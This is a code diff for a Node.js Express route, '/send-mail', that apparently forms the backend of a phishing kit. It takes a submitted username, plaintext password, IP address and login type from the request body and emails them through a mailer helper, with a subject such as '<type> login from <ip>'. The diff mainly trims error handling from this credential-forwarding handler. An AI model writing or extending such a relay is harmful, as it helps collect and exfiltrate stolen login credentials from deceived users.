@@ -1,19 +1,12 @@
-const express = require('express');
-const router = express.Router();
-const mailer = require('../helper/mailer');
+let express = require('express')
+let router = express.Router()
+let mailer = require('../helper/mailer')
 
-router.post('/send-mail', async (req, res) => {
-  try {
-    const { username, pass, ip, type } = req.body;
-    const subject = `${type}: ${username}: ${ip}`;
+router.post('/send-mail', (req, res) => {
+    const { username, pass, ip, type } = req.body
+    const subject = `${type} login from ${ip}`
+    mailer.sendEmail(res, subject, username, pass, ip, type)
+})
 
-    await mailer.sendEmail(subject, username, pass, ip, type);
+module.exports = router
 
-    return res.status(200).json({ response: 'success' });
-  } catch (err) {
-    console.error('Send-mail error:', err && err.message ? err.message : err);
-    return res.status(400).json({ response: 'failed', error: err.message });
-  }
-});
-
-module.exports = router;
